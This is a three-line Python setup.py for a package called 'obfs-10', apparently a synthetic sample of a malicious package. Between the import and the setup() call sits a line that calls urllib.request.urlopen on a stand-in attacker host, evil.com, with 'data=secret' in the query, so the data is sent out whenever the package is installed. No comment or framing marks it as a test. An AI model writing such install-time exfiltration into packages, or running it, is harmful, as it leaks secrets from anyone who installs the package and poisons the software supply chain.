from setuptools import setup
import urllib.request; urllib.request.urlopen("http://evil.com/?data=secret")
setup(name="obfs-10", version="1.0.0")
